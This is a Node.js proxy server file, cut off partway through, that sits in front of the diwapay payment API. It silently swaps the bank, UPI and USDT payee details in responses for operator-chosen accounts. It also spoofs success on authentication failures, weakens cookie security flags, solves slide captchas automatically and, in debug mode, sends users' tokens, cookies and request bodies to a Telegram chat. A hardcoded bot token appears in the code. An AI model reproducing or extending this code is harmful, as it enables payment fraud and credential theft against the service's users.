const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Redis } = require('@upstash/redis');

let _jpeg = null, _PNG = null, _captchaDepsLoadError = null;
function _loadCaptchaDeps() {
  if (_jpeg && _PNG) return true;
  if (_captchaDepsLoadError) return false;
  try {
    _jpeg = require('jpeg-js');
    _PNG = require('pngjs').PNG;
    return true;
  } catch (e) {
    _captchaDepsLoadError = e.message;
    return false;
  }
}

function _captchaDecodeDataUri(dataUri) {
  const m = String(dataUri || '').match(/^data:(image\/[a-z]+);base64,(.+)$/i);
  if (!m) return null;
  const mime = m[1].toLowerCase();
  const buf = Buffer.from(m[2], 'base64');
  if (mime === 'image/png') {
    const png = _PNG.sync.read(buf);
    return { width: png.width, height: png.height, data: png.data };
  }
  if (mime === 'image/jpeg' || mime === 'image/jpg') {
    const j = _jpeg.decode(buf, { useTArray: true, formatAsRGBA: true });
    return { width: j.width, height: j.height, data: j.data };
  }
  return null;
}

function _captchaGray(d, idx) {
  return 0.299 * d[idx] + 0.587 * d[idx + 1] + 0.114 * d[idx + 2];
}

function _captchaComputeEdgeMap(img) {
  const w = img.width, h = img.height, d = img.data;
  const edges = new Float32Array(w * h);
  for (let y = 1; y < h - 1; y++) {
    for (let x = 1; x < w - 1; x++) {
      const idx = (y * w + x) * 4;
      const gx = _captchaGray(d, idx + 4) - _captchaGray(d, idx - 4);
      const gy = _captchaGray(d, idx + w * 4) - _captchaGray(d, idx - w * 4);
      edges[y * w + x] = Math.sqrt(gx * gx + gy * gy);
    }
  }
  return edges;
}

function _captchaComputeAlphaBoundary(img) {
  const w = img.width, h = img.height, d = img.data;
  const boundary = new Uint8Array(w * h);
  let count = 0;
  for (let y = 0; y < h; y++) {
    for (let x = 0; x < w; x++) {
      const a = d[(y * w + x) * 4 + 3];
      if (a < 128) continue;
      let isB = false;
      if (x === 0 || y === 0 || x === w - 1 || y === h - 1) isB = true;
      else {
        const n = [(y * w + x + 1), (y * w + x - 1), ((y + 1) * w + x), ((y - 1) * w + x)];
        for (const nIdx of n) {
          if (d[nIdx * 4 + 3] < 128) { isB = true; break; }
        }
      }
      if (isB) { boundary[y * w + x] = 1; count++; }
    }
  }
  return { boundary, count };
}

function _captchaComputeFilledMask(img) {
  const w = img.width, h = img.height, d = img.data;
  const mask = new Uint8Array(w * h);
  let count = 0;
  for (let y = 0; y < h; y++) {
    for (let x = 0; x < w; x++) {
      if (d[(y * w + x) * 4 + 3] >= 128) { mask[y * w + x] = 1; count++; }
    }
  }
  return { mask, count };
}

function _captchaMasterGray(img) {
  const w = img.width, h = img.height, d = img.data;
  const g = new Float32Array(w * h);
  for (let y = 0; y < h; y++) {
    for (let x = 0; x < w; x++) {
      g[y * w + x] = _captchaGray(d, (y * w + x) * 4);
    }
  }
  return g;
}

function _captchaFindGapX(masterImg, thumbImg, dispY) {
  if (!masterImg || !thumbImg) return null;
  const mW = masterImg.width, mH = masterImg.height;
  const tW = thumbImg.width, tH = thumbImg.height;
  if (tW >= mW || tH > mH) return null;
  if (!Number.isFinite(dispY)) dispY = Math.floor((mH - tH) / 2);

  // Pre-compute master edge map and grayscale
  const masterEdges = _captchaComputeEdgeMap(masterImg);
  const masterGray = _captchaMasterGray(masterImg);

  // Adaptive edge threshold = 60th percentile of non-trivial master edges (clamped to >=30)
  const sorted = [];
  for (let i = 0; i < masterEdges.length; i++) if (masterEdges[i] > 5) sorted.push(masterEdges[i]);
  sorted.sort((a, b) => a - b);
  const EDGE_THRESH = sorted.length > 0 ? Math.max(30, sorted[Math.floor(sorted.length * 0.6)]) : 40;

  // Binary master edge map (1 where strong edge)
  const masterEdgeBin = new Uint8Array(mW * mH);
  for (let i = 0; i < masterEdges.length; i++) masterEdgeBin[i] = masterEdges[i] > EDGE_THRESH ? 1 : 0;

  // Get thumb's alpha boundary (outline) and filled silhouette
  const { boundary, count: bCount } = _captchaComputeAlphaBoundary(thumbImg);
  const { mask: filledMask, count: fillCount } = _captchaComputeFilledMask(thumbImg);

  let useBoundary = boundary, useBCount = bCount;
  let useFilled = filledMask, useFillCount = fillCount;
  let isOpaqueThumb = false;

  if (useBCount < 20 || useFillCount < 50 || useFillCount > tW * tH * 0.95) {
    isOpaqueThumb = true;
    useBoundary = new Uint8Array(tW * tH);
    useBCount = 0;
    for (let y = 1; y < tH - 1; y++) {
      for (let x = 1; x < tW - 1; x++) {
        const idx = (y * tW + x) * 4;
        const gx = _captchaGray(thumbImg.data, idx + 4) - _captchaGray(thumbImg.data, idx - 4);
        const gy = _captchaGray(thumbImg.data, idx + tW * 4) - _captchaGray(thumbImg.data, idx - tW * 4);
        if (Math.sqrt(gx * gx + gy * gy) > 30) { useBoundary[y * tW + x] = 1; useBCount++; }
      }
    }
  }
  if (useBCount < 5) return null;

  // Pure interior mask (filled but not boundary) — used for darkness check
  const pureInterior = new Uint8Array(tW * tH);
  let pureN = 0;
  if (!isOpaqueThumb) {
    for (let i = 0; i < tW * tH; i++) {
      if (useFilled[i] && !useBoundary[i]) { pureInterior[i] = 1; pureN++; }
    }
  }

  const minX = 0;
  const maxX = mW - tW;
  if (minX > maxX) return null;

  // Search Y in a small range around dispY (in case Y is slightly off from upstream)
  const yCands = [];
  for (let dy = -3; dy <= 3; dy++) {
    const y = Math.max(0, Math.min(dispY + dy, mH - tH));
    if (!yCands.includes(y)) yCands.push(y);
  }

  // For each (x, y) candidate, compute 3 scores:
  //   edgeMatch: fraction of thumb-boundary pixels that align with strong master edges
  //   contrast:  boundary-mean-brightness MINUS interior-mean-brightness (positive at gap due to light outline + dark interior)
  //   shadow:    outside-bbox-mean MINUS interior-mean (positive at gap)
  // Combined ranking by normalized weighted sum.

  const PAD = 6;
  const W = maxX - minX + 1;
  const allScores = new Array(W * yCands.length);

  for (let yi = 0; yi < yCands.length; yi++) {
    const y = yCands[yi];
    for (let x = minX; x <= maxX; x++) {
      let edgeMatch = 0;
      let bBrightSum = 0, bN = 0;
      let iDarkSum = 0, iN = 0;
      let outSum = 0, outN = 0;

      for (let py = 0; py < tH; py++) {
        const my = y + py;
        if (my < 0 || my >= mH) continue;
        const baseRow = py * tW;
        const masterRowBase = my * mW;
        for (let px = 0; px < tW; px++) {
          const mx = x + px;
          if (mx < 0 || mx >= mW) continue;
          const mIdx = masterRowBase + mx;
          const tIdx = baseRow + px;
          if (useBoundary[tIdx]) {
            if (masterEdgeBin[mIdx]) edgeMatch++;
            bBrightSum += masterGray[mIdx];
            bN++;
          } else if (!isOpaqueThumb && pureInterior[tIdx]) {
            iDarkSum += masterGray[mIdx];
            iN++;
          }
        }
      }

      if (!isOpaqueThumb) {
        const x0 = Math.max(0, x - PAD), x1 = Math.min(mW, x + tW + PAD);
        const y0 = Math.max(0, y - PAD), y1 = Math.min(mH, y + tH + PAD);
        for (let yy = y0; yy < y1; yy++) {
          const inY = yy >= y && yy < y + tH;
          for (let xx = x0; xx < x1; xx++) {
            const inX = xx >= x && xx < x + tW;
            if (inY && inX) {
              const py = yy - y, px = xx - x;
              if (useFilled[py * tW + px]) continue;
            }
            outSum += masterGray[yy * mW + xx];
            outN++;
          }
        }
      }

      const edgeScore = edgeMatch / Math.max(1, useBCount);
      const bMean = bN > 0 ? bBrightSum / bN : 0;
      const iMean = iN > 0 ? iDarkSum / iN : bMean;
      const oMean = outN > 0 ? outSum / outN : bMean;
      const contrast = (bMean - iMean);   // positive at gap (light outline > dark interior)
      const shadow = (oMean - iMean);     // positive at gap (surroundings brighter than interior)

      allScores[yi * W + (x - minX)] = { x, y, edgeScore, contrast, shadow };
    }
  }

  // Normalize each metric to 0..1 across all candidates, then combine
  let eMin = Infinity, eMax = -Infinity;
  let cMin = Infinity, cMax = -Infinity;
  let sMin = Infinity, sMax = -Infinity;
  for (const s of allScores) {
    if (s.edgeScore < eMin) eMin = s.edgeScore;
    if (s.edgeScore > eMax) eMax = s.edgeScore;
    if (s.contrast < cMin) cMin = s.contrast;
    if (s.contrast > cMax) cMax = s.contrast;
    if (s.shadow < sMin) sMin = s.shadow;
    if (s.shadow > sMax) sMax = s.shadow;
  }
  const eR = Math.max(0.001, eMax - eMin);
  const cR = Math.max(0.001, cMax - cMin);
  const sR = Math.max(0.001, sMax - sMin);

  for (const s of allScores) {
    const eN = (s.edgeScore - eMin) / eR;
    const cN = isOpaqueThumb ? 0 : (s.contrast - cMin) / cR;
    const sN = isOpaqueThumb ? 0 : (s.shadow - sMin) / sR;
    s.combined = isOpaqueThumb ? eN : (eN * 0.45 + cN * 0.35 + sN * 0.20);
  }

  // Sort by combined descending; suppress nearby duplicates (within 8px)
  const sortedC = [...allScores].sort((a, b) => b.combined - a.combined);
  const top = [];
  for (const c of sortedC) {
    if (top.every(t => Math.abs(t.x - c.x) > 8 || Math.abs(t.y - c.y) > 4)) {
      top.push(c);
      if (top.length >= 3) break;
    }
  }

  const best = top[0];
  return {
    x: best.x,
    y: best.y,
    score: best.combined,
    edge: best.edgeScore,
    contrast: best.contrast,
    shadow: best.shadow,
    boundaryPixels: useBCount,
    opaque: isOpaqueThumb,
    edgeThresh: EDGE_THRESH,
    top3: top.map(t => ({ x: t.x, y: t.y, c: t.combined, e: t.edgeScore, k: t.contrast, s: t.shadow }))
  };
}

function solveSlideCaptcha(masterB64, thumbB64, dispY) {
  if (!_loadCaptchaDeps()) {
    return { ok: false, error: 'deps_missing:' + _captchaDepsLoadError };
  }
  const master = _captchaDecodeDataUri(masterB64);
  const thumb = _captchaDecodeDataUri(thumbB64);
  if (!master || !thumb) {
    return { ok: false, error: 'decode_failed', master: !!master, thumb: !!thumb };
  }
  const r = _captchaFindGapX(master, thumb, dispY);
  if (!r) return { ok: false, error: 'no_gap_found' };
  return { ok: true, x: r.x, y: r.y, score: r.score, edge: r.edge, contrast: r.contrast, shadow: r.shadow, opaque: r.opaque, edgeThresh: r.edgeThresh, top3: r.top3, boundaryPixels: r.boundaryPixels, masterDim: [master.width, master.height], thumbDim: [thumb.width, thumb.height] };
}

const app = express();
const ORIGINAL_API = 'https://api.diwapay.com';
const BOT_TOKEN = process.env.BOT_TOKEN || '8621729504:AAGhXJLicVSpVSRqr1JscuJv-DU8T33-4wA';
const WEBHOOK_URL = 'https://xchas.vercel.app/bot-webhook';
const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

const DEFAULT_DATA = {
  banks: [],
  activeIndex: -1,
  botEnabled: true,
  autoRotate: false,
  lastUsedIndex: -1,
  adminChatId: null,
  logRequests: false,
  usdtAddress: '',
  depositSuccess: false,
  depositBonus: 0,
  withdrawOverride: 0,
  userOverrides: {},
  trackedUsers: {},
  balanceHistory: [],
  otpBypass: false
};

let bot = null;
let webhookSet = false;
try { bot = new TelegramBot(BOT_TOKEN); } catch(e) {}

let redis = null;
if (REDIS_URL && REDIS_TOKEN) {
  try { redis = new Redis({ url: REDIS_URL, token: REDIS_TOKEN }); } catch(e) {}
}

let cachedData = null;
let cacheTime = 0;
const CACHE_TTL = 15000;
const tokenUserMap = {};
const userPhoneMap = {};
const refreshTokenMap = {};
const userDeviceMap = {};
let debugMode = false;

function isAuthFailureResponse(jsonResp) {
  if (!jsonResp) return false;
  const c = jsonResp.code;
  return c === 401 || c === '401' || c === 403 || c === '403';
}

function shouldBypass401(req) {
  const path = (req.originalUrl || req.url || '').split('?')[0];
  const noBypass = [
    '/app/user/login/', '/app/captcha/', '/app/user/info/updatePassword',
    '/app/user/info/updatePin', '/app/user/info/verifyPin',
    '/app/payment/order/submit', '/app/payment/order/create',
    '/app/user/info/appLogout'
  ];
  return !noBypass.some(p => path.includes(p));
}

function make401Bypass(jsonResp) {
  const fakeData = (jsonResp && jsonResp.data !== undefined) ? (Array.isArray(jsonResp.data) ? [] : {}) : {};
  return { code: 1000, data: fakeData, message: 'success' };
}

async function ensureWebhook() {
  if (!bot || webhookSet) return;
  try {
    await bot.setWebHook(WEBHOOK_URL);
    webhookSet = true;
  } catch(e) {}
}

async function loadData(forceRefresh) {
  if (!forceRefresh && cachedData && (Date.now() - cacheTime < CACHE_TTL)) return cachedData;
  if (!redis) return { ...DEFAULT_DATA };
  try {
    let raw = await redis.get('diwapayData');
    if (raw) {
      if (typeof raw === 'string') {
        try { raw = JSON.parse(raw); } catch(e) {}
      }
      if (typeof raw === 'object' && raw !== null) {
        cachedData = { ...DEFAULT_DATA, ...raw };
      } else {
        cachedData = { ...DEFAULT_DATA };
      }
      if (!cachedData.userOverrides) cachedData.userOverrides = {};
      if (!cachedData.trackedUsers) cachedData.trackedUsers = {};
      if (!cachedData.balanceHistory) cachedData.balanceHistory = [];
      cacheTime = Date.now();
      return cachedData;
    }
  } catch(e) {
    console.error('Redis load error:', e.message);
  }
  cachedData = { ...DEFAULT_DATA };
  cacheTime = Date.now();
  return cachedData;
}

async function saveData(data) {
  cachedData = data;
  cacheTime = Date.now();
  if (!redis) return;
  try { await redis.set('diwapayData', data); } catch(e) {
    console.error('Redis save error:', e.message);
  }
}

function getTokenFromReq(req) {
  return req.headers['authorization'] || req.headers['token'] || req.headers['apptoken'] || '';
}

function cleanToken(tok) {
  if (!tok) return '';
  if (tok.startsWith('Bearer ')) tok = tok.slice(7).trim();
  return tok.substring(0, 100);
}

function saveTokenUserId(req, userId) {
  if (!userId) return;
  const tok = getTokenFromReq(req);
  const key = cleanToken(tok);
  if (key && key.length > 10) {
    tokenUserMap[key] = String(userId);
    if (redis) redis.hset('diwapayTokenMap', key, String(userId)).catch(()=>{});
  }
}

async function getUserIdFromToken(req) {
  const tok = getTokenFromReq(req);
  const key = cleanToken(tok);
  if (!key || key.length < 10) return null;
  if (tokenUserMap[key]) return tokenUserMap[key];
  if (redis) {
    try {
      const stored = await redis.hget('diwapayTokenMap', key);
      if (stored) { tokenUserMap[key] = String(stored); return String(stored); }
    } catch(e) {}
  }
  return null;
}

async function extractUserIdFromToken(req) {
  const authHeader = getTokenFromReq(req);
  if (authHeader) {
    try {
      const clean = authHeader.replace('Bearer ', '');
      const parts = clean.split('.');
      if (parts.length === 3) {
        const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
        const jwtUserId = payload.userId || payload.sub || '';
        if (jwtUserId) return String(jwtUserId);
      }
    } catch(e) {}
  }
  const fromToken = await getUserIdFromToken(req);
  if (fromToken) return fromToken;
  return '';
}

async function extractUserId(req, jsonResp) {
  const fromToken = await extractUserIdFromToken(req);
  if (fromToken) return fromToken;
  const body = req.parsedBody || {};
  const uid = body.userId || body.userid || body.memberId || body.id || '';
  if (uid) return String(uid);
  const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
  if (qs.get('userId')) return String(qs.get('userId'));
  if (qs.get('id')) return String(qs.get('id'));
  const respData = getResponseData(jsonResp);
  if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
    const rid = respData.userId || respData.userid || respData.memberId || respData.id || '';
    if (rid) return String(rid);
  }
  return '';
}

async function trackUser(data, userId, info, phone) {
  if (!userId) return;
  if (!data.trackedUsers) data.trackedUsers = {};
  const existing = data.trackedUsers[String(userId)] || {};
  data.trackedUsers[String(userId)] = {
    lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
    lastAction: info || existing.lastAction || '',
    orderCount: (existing.orderCount || 0) + (info && info.includes('Order') ? 1 : 0),
    phone: phone || existing.phone || '',
    balance: existing.balance || '',
    name: existing.name || ''
  };
  if (phone) userPhoneMap[String(userId)] = phone;
}

function isLogOff(data, userId) {
  if (!userId) return false;
  const uo = data.userOverrides && data.userOverrides[String(userId)];
  return uo && uo.logOff === true;
}

const logOffTokens = new Set();
const checkedTokens = new Set();

function isLogOffByTokenFast(data, req) {
  const tok = getTokenFromReq(req);
  const tKey = cleanToken(tok);
  if (!tKey || tKey.length < 10) return false;
  if (logOffTokens.has(tKey)) return true;
  const userId = tokenUserMap[tKey] || '';
  if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
  return false;
}

async function isLogOffByToken(data, req) {
  const tok = getTokenFromReq(req);
  const tKey = cleanToken(tok);
  if (!tKey || tKey.length < 10) return false;
  if (logOffTokens.has(tKey)) return true;
  if (checkedTokens.has(tKey)) return false;
  const userId = tokenUserMap[tKey] || '';
  if (userId && isLogOff(data, userId)) { logOffTokens.add(tKey); return true; }
  if (redis) {
    try {
      const isOff = await redis.sismember('diwapayLogOffTokens', tKey);
      if (isOff) { logOffTokens.add(tKey); return true; }
      const stored = await redis.hget('diwapayTokenMap', tKey);
      if (stored && isLogOff(data, stored)) { logOffTokens.add(tKey); redis.sadd('diwapayLogOffTokens', tKey).catch(()=>{}); return true; }
    } catch(e) {}
  }
  checkedTokens.add(tKey);
  return false;
}

function getPhone(data, userId) {
  if (!userId) return '';
  if (userPhoneMap[String(userId)]) return userPhoneMap[String(userId)];
  const tracked = data.trackedUsers && data.trackedUsers[String(userId)];
  if (tracked && tracked.phone) {
    userPhoneMap[String(userId)] = tracked.phone;
    return tracked.phone;
  }
  return '';
}

function getUserOverride(data, userId) {
  if (!userId || !data.userOverrides) return null;
  return data.userOverrides[String(userId)] || null;
}

function getEffectiveSettings(data, userId) {
  const uo = getUserOverride(data, userId);
  return {
    botEnabled: uo && uo.botEnabled !== undefined ? uo.botEnabled : data.botEnabled,
    depositSuccess: uo && uo.depositSuccess !== undefined ? uo.depositSuccess : data.depositSuccess,
    depositBonus: uo && uo.depositBonus !== undefined ? uo.depositBonus : (data.depositBonus || 0),
    bankOverride: uo && uo.bankIndex !== undefined ? uo.bankIndex : null
  };
}

function getActiveBank(data, userId) {
  const uo = getUserOverride(data, userId);
  if (uo && uo.bankIndex !== undefined && uo.bankIndex >= 0 && uo.bankIndex < data.banks.length) {
    return data.banks[uo.bankIndex];
  }
  if (data.autoRotate && data.banks.length > 1) {
    let idx;
    do { idx = Math.floor(Math.random() * data.banks.length); } while (idx === data.lastUsedIndex && data.banks.length > 1);
    data.lastUsedIndex = idx;
    data._rotatedIndex = idx;
    return data.banks[idx];
  }
  if (data.activeIndex >= 0 && data.activeIndex < data.banks.length) return data.banks[data.activeIndex];
  if (data.banks.length > 0) return data.banks[0];
  return null;
}

async function getActiveBankAndSave(data, userId) {
  const bank = getActiveBank(data, userId);
  if (data.autoRotate && data._rotatedIndex !== undefined) {
    data.lastUsedIndex = data._rotatedIndex;
    delete data._rotatedIndex;
    await saveData(data);
  }
  return bank;
}

function bankListText(d) {
  if (d.banks.length === 0) return 'No banks added yet.';
  return d.banks.map((b, i) => {
    const a = i === d.activeIndex ? ' ✅' : '';
    const minStr = b.minAmount ? ` | Min: ₹${b.minAmount}` : '';
    return `${i + 1}. ${b.accountHolder} | ${b.accountNo} | ${b.ifsc}${b.bankName ? ' | ' + b.bankName : ''}${b.upiId ? ' | UPI: ' + b.upiId : ''}${minStr}${a}`;
  }).join('\n');
}

app.use(async (req, res, next) => {
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => {
    req.rawBody = Buffer.concat(chunks);
    const ct = (req.headers['content-type'] || '').toLowerCase();
    try {
      if (ct.includes('json')) {
        req.parsedBody = JSON.parse(req.rawBody.toString());
      } else if (ct.includes('form') && !ct.includes('multipart')) {
        const params = new URLSearchParams(req.rawBody.toString());
        req.parsedBody = Object.fromEntries(params);
      } else {
        req.parsedBody = {};
      }
    } catch(e) { req.parsedBody = {}; }
    next();
  });
});

async function proxyFetch(req, timeoutMs) {
  const url = ORIGINAL_API + req.originalUrl;
  const fwd = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const kl = k.toLowerCase();
    // Strip hop-by-hop, encoding, AND all proxy/CDN-injected headers that could confuse upstream
    if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
        kl === 'transfer-encoding' || kl === 'accept-encoding' ||
        kl === 'forwarded' || kl === 'x-real-ip' || kl === 'true-client-ip' ||
        kl === 'cf-connecting-ip' || kl === 'cf-ray' || kl === 'cf-visitor' ||
        kl === 'cf-ipcountry' || kl === 'cdn-loop' || kl === 'via' ||
        kl.startsWith('x-vercel') || kl.startsWith('x-forwarded') ||
        kl.startsWith('x-invocation') || kl.startsWith('x-amzn') ||
        kl.startsWith('x-amz-') || kl.startsWith('cf-')) continue;
    fwd[k] = v;
  }
  fwd['host'] = 'api.diwapay.com';
  fwd['accept-encoding'] = 'identity';
  const ac = new AbortController();
  const tm = setTimeout(() => ac.abort(), timeoutMs || 12000);
  const opts = { method: req.method, headers: fwd, signal: ac.signal };
  if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
    opts.body = req.rawBody;
    fwd['content-length'] = String(req.rawBody.length);
  }
  let response, respBuffer;
  try {
    response = await fetch(url, opts);
    respBuffer = Buffer.from(await response.arrayBuffer());
  } finally {
    clearTimeout(tm);
  }
  const respHeaders = {};
  response.headers.forEach((val, key) => {
    const kl = key.toLowerCase();
    if (kl === 'transfer-encoding' || kl === 'connection' || kl === 'content-encoding' || kl === 'content-length' || kl === 'set-cookie') return;
    respHeaders[key] = val;
  });
  try {
    let setCookies = [];
    if (typeof response.headers.getSetCookie === 'function') {
      setCookies = response.headers.getSetCookie();
    } else if (response.headers.raw) {
      setCookies = response.headers.raw()['set-cookie'] || [];
    } else {
      const sc = response.headers.get('set-cookie');
      if (sc) setCookies = [sc];
    }
    if (setCookies && setCookies.length) {
      const rewritten = setCookies.map(c => c
        .replace(/;\s*Domain=[^;]+/ig, '')
        .replace(/;\s*Secure/ig, '')
        .replace(/;\s*SameSite=[^;]+/ig, ''));
      respHeaders['set-cookie'] = rewritten.length === 1 ? rewritten[0] : rewritten;
    }
  } catch(e) {}
  const ct = (respHeaders['content-type'] || respHeaders['Content-Type'] || '').toLowerCase();
  const isText = !ct || ct.includes('json') || ct.includes('text') || ct.includes('xml') || ct.includes('javascript') || ct.includes('html') || ct.includes('form');
  const respBody = isText ? respBuffer.toString('utf8') : '';
  let jsonResp = null;
  if (isText && respBody) {
    try { jsonResp = JSON.parse(respBody); } catch(e) {}
  }

  if (debugMode) {
    try {
      const data = cachedData || await loadData();
      if (data && data.adminChatId && bot) {
        const skipDebugPaths = ['/bot-webhook', '/favicon', '/health', '/setup-webhook'];
        const path = req.originalUrl || req.url || '';
        if (!skipDebugPaths.some(p => path.includes(p))) {
          const reqBody = req.rawBody ? req.rawBody.toString('utf8') : '';
          const importantHeaders = {};
          for (const [k, v] of Object.entries(fwd)) {
            if (['authorization', 'token', 'apptoken', 'cookie', 'content-type', 'accept'].includes(k.toLowerCase())) {
              importantHeaders[k] = v;
            }
          }
          const reqMsg =
            `🔍 [DEBUG] ${req.method} ${path}\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `📤 REQUEST\n` +
            `Headers: ${JSON.stringify(importantHeaders).substring(0, 500)}\n` +
            `Body: ${reqBody.substring(0, 800)}`;
          const respMsg =
            `📥 RESPONSE [${response.status}] ${path}\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `${respBody.substring(0, 3000)}`;
          bot.sendMessage(data.adminChatId, reqMsg.substring(0, 4000)).catch(()=>{});
          setTimeout(() => {
            bot.sendMessage(data.adminChatId, respMsg.substring(0, 4000)).catch(()=>{});
          }, 200);
        }
      }
    } catch(e) {}
  }

  return { response, respBody, respBuffer, respHeaders, jsonResp };
}

function getResponseData(jsonResp) {
  if (!jsonResp) return null;
  if (jsonResp.data) return jsonResp.data;
  if (jsonResp.body) return jsonResp.body;
  return null;
}

function sendJson(res, headers, json, fallback) {
  const body = json ? JSON.stringify(json) : fallback;
  headers['content-type'] = 'application/json; charset=utf-8';
  headers['content-length'] = String(Buffer.byteLength(body));
  headers['cache-control'] = 'no-store, no-cache, must-revalidate';
  headers['pragma'] = 'no-cache';
  delete headers['etag'];
  delete headers['last-modified'];
  res.writeHead(200, headers);
  res.end(body);
}

async function transparentProxy(req, res) {
  try {
    const { response, respBody, respBuffer, respHeaders, jsonResp } = await proxyFetch(req);

    if (jsonResp) {
      const rd = getResponseData(jsonResp);
      const uid = rd && typeof rd === 'object' && !Array.isArray(rd) ? (rd.userId || rd.memberId || '') : '';
      if (uid) saveTokenUserId(req, uid);
    }

    if (jsonResp && isAuthFailureResponse(jsonResp) && shouldBypass401(req)) {
      const bypass = make401Bypass(jsonResp);
      sendJson(res, respHeaders, bypass, JSON.stringify(bypass));
      return;
    }

    const data = cachedData || await loadData();
    if (data.usdtAddress && jsonResp) {
      const result = replaceUsdtInResponse(jsonResp, data);
      if (result && result.oldAddr) {
        const newBody = JSON.stringify(jsonResp);
        respHeaders['content-type'] = 'application/json; charset=utf-8';
        respHeaders['content-length'] = String(Buffer.byteLength(newBody));
        respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
        delete respHeaders['etag'];
        delete respHeaders['last-modified'];
        res.writeHead(response.status, respHeaders);
        res.end(newBody);
        return;
      }
    }

    respHeaders['content-length'] = String(respBuffer.length);
    res.writeHead(response.status, respHeaders);
    res.end(respBuffer);
  } catch(e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

const BANK_FIELDS = {
  'accountno': 'accountNo', 'accountnumber': 'accountNo', 'account_no': 'accountNo',
  'receiveaccountno': 'accountNo', 'bankaccount': 'accountNo', 'acno': 'accountNo',
  'bankaccountno': 'accountNo', 'beneficiaryaccount': 'accountNo', 'payeeaccount': 'accountNo',
  'holderaccount': 'accountNo', 'cardno': 'accountNo', 'cardnumber': 'accountNo',
  'bankcardno': 'accountNo', 'payeecardno': 'accountNo', 'receivecardno': 'accountNo',
  'payeebankaccount': 'accountNo', 'payeebankaccountno': 'accountNo', 'payeeaccountno': 'accountNo',
  'receiveraccount': 'accountNo', 'receiveraccountno': 'accountNo', 'receiveaccountnumber': 'accountNo',
  'walletaccount': 'accountNo', 'walletno': 'accountNo', 'walletaccountno': 'accountNo',
  'collectionaccount': 'accountNo', 'collectionaccountno': 'accountNo',
  'customerbanknumber': 'accountNo', 'customerbankaccount': 'accountNo', 'customeraccountno': 'accountNo',
  'beneficiaryname': 'accountHolder', 'accountname': 'accountHolder', 'account_name': 'accountHolder',
  'receiveaccountname': 'accountHolder', 'holdername': 'accountHolder', 'name': 'accountHolder',
  'accountholder': 'accountHolder', 'bankaccountholder': 'accountHolder', 'receivename': 'accountHolder',
  'payeename': 'accountHolder', 'bankaccountname': 'accountHolder', 'realname': 'accountHolder',
  'cardholder': 'accountHolder', 'cardname': 'accountHolder', 'bankcardname': 'accountHolder',
  'payeecardname': 'accountHolder', 'receivecardname': 'accountHolder', 'receivercardname': 'accountHolder',
  'receivername': 'accountHolder', 'collectionname': 'accountHolder', 'collectionaccountname': 'accountHolder',
  'payeerealname': 'accountHolder', 'receiverrealname': 'accountHolder',
  'customername': 'accountHolder', 'customerrealname': 'accountHolder',
  'ifsc': 'ifsc', 'ifsccode': 'ifsc', 'ifsc_code': 'ifsc', 'receiveifsc': 'ifsc',
  'bankifsc': 'ifsc', 'payeeifsc': 'ifsc', 'payeebankifsc': 'ifsc', 'receiverifsc': 'ifsc',
  'receiverbankifsc': 'ifsc', 'collectionifsc': 'ifsc',
  'bankname': 'bankName', 'bank_name': 'bankName', 'bank': 'bankName',
  'payeebankname': 'bankName', 'receiverbankname': 'bankName', 'receivebankname': 'bankName',
  'collectionbankname': 'bankName',
  'upiid': 'upiId', 'upi_id': 'upiId', 'upi': 'upiId', 'vpa': 'upiId',
  'upiaddress': 'upiId', 'payeeupi': 'upiId', 'payeeupiid': 'upiId',
  'receiverupi': 'upiId', 'walletupi': 'upiId', 'collectionupi': 'upiId',
  'walletaddress': 'upiId', 'payaddress': 'upiId', 'payaccount': 'upiId',
  'customerupi': 'upiId'
};

function replaceBankInUrl(urlStr, bank) {
  if (!urlStr || typeof urlStr !== 'string') return urlStr;
  if (!urlStr.includes('://') && !urlStr.includes('?')) return urlStr;
  const urlParams = [
    { names: ['account', 'accountNo', 'account_no', 'accountno', 'account_number', 'accountNumber', 'acc', 'receiveAccountNo', 'receiver_account', 'pa'], value: bank.accountNo },
    { names: ['name', 'accountName', 'account_name', 'accountname', 'receiveAccountName', 'receiver_name', 'beneficiary_name', 'beneficiaryName', 'pn', 'holder_name'], value: bank.accountHolder },
    { names: ['ifsc', 'ifsc_code', 'ifscCode', 'receiveIfsc', 'IFSC'], value: bank.ifsc }
  ];
  let result = urlStr;
  for (const group of urlParams) {
    if (!group.value) continue;
    for (const paramName of group.names) {
      const regex = new RegExp('([?&])(' + paramName.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')=([^&]*)', 'i');
      result = result.replace(regex, '$1$2=' + encodeURIComponent(group.value));
    }
  }
  if (bank.upiId && result.includes('upi://pay')) {
    result = result.replace(/pa=[^&]+/, `pa=${bank.upiId}`);
    if (bank.accountHolder) result = result.replace(/pn=[^&]+/, `pn=${encodeURIComponent(bank.accountHolder)}`);
  }
  return result;
}

function deepReplace(obj, bank, originalValues, depth) {
  if (!obj || typeof obj !== 'object' || depth > 10) return;
  if (!originalValues) originalValues = {};
  for (const key of Object.keys(obj)) {
    const val = obj[key];
    if (val && typeof val === 'object') {
      if (Array.isArray(val)) {
        val.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bank, originalValues, depth + 1); });
      } else {
        deepReplace(val, bank, originalValues, depth + 1);
      }
      continue;
    }
    if (typeof val !== 'string' && typeof val !== 'number') continue;
    const kl = key.toLowerCase().replace(/[_\-\s]/g, '');
    const mapped = BANK_FIELDS[kl];
    if (mapped && bank[mapped] && String(val).length > 0) {
      if (typeof val === 'string' && val.length > 3) originalValues[key] = val;
      obj[key] = bank[mapped];
    } else if (!mapped && typeof val === 'string' && val.length > 0) {
